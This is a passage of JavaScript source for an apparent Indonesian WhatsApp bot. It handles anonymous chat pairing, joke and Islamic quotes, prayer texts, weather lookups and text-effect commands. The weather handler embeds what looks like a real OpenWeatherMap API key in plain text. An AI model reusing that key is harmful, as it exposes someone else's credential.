reply(`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
 }
break
//=========================================\\======
case 'mulai': case 'start': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
reply(`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`)
return false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
kyy.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
return false
}
let other = romeo.other(m.sender)
if (other) await kyy.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
kyy.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
}
break
//=========================================\\======
case 'quotesanime':
case 'quotesanim': {
  let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) return await res.text()
  let json = await res.json()
  if(!json.result[0]) return json
  let { indo, character, anime } = json.result[0]
  reply(`${indo}\n\n📮By:  _${character}_ \nAnime:\n${anime}`)
}
break
 case 'quotesbacot': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  reply(bacotan)
}
break
 case 'fliptext': {
if (args.length < 1) return reply(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
 case 'kisahnabi': {
     if (!text) return reply(`Masukan nama nabi\nExample: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return reply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     reply(`${hasil}`)

}
break
case 'cuaca':
case 'weather':{
if (!text) return reply('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           kyy.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'ayatkursi': {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
  reply(caption)
}
break
//=========================================\\
case 'bacaansholat': {
const bacaanshalat = {
  "result": [
    {
      "id": 1,
      "name": "Bacaan Iftitah",
      "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
      "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
      "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
    },
    {
      "id": 2,
      "name": "Al Fatihah",
      "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
      "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
      "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
    },
    {
      "id": 3,
      "name": "Bacaan Ruku",
      "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
      "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
      "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
    },
    {
      "id": 4,
      "name": "Bacaan Sujud",
      "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
      "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
      "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
    },
    {
      "id": 5,
      "name": "Bacaan Duduk Diantara Dua Sujud",
      "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
      "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
      "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
    },
    {
      "id": 6,
      "name": "Duduk Tasyahud Awal",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
      "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
    },
    {
      "id": 7,
      "name": "Duduk Tasyahud Akhir",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
      "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
    },
    {
      "id": 8,
      "name": "Salam",
      "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
      "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
      "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
    }
  ]
}
    let bacaan = JSON.stringify(bacaanshalat)
    let json = JSON.parse(bacaan)
    let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    reply(`${contoh} + ${data}`)
}
break
//=========================================\\
case 'doaharian': {
    let src = JSON.parse(fs.readFileSync('./database/doaharian.json', 'utf-8'))
    let caption = src.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    reply(`${caption}`)

}
break
//=========================================\\   
case 'niatsholat': {
    if (!q) return reply(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return reply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    reply(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break
//=========================================\\
case 'quotesislami': {
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    reply(`${arabic}\n${arti}`)
}
break
//=========================================\\
case 'doatahlil': {
    let { result } = JSON.parse(fs.readFileSync('./database/tahlil.json', 'utf-8'))
    let caption = result.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    reply(`${caption}`)
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!q) return reply(`Example : ${prefix+command} ryozingod`) 
reply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
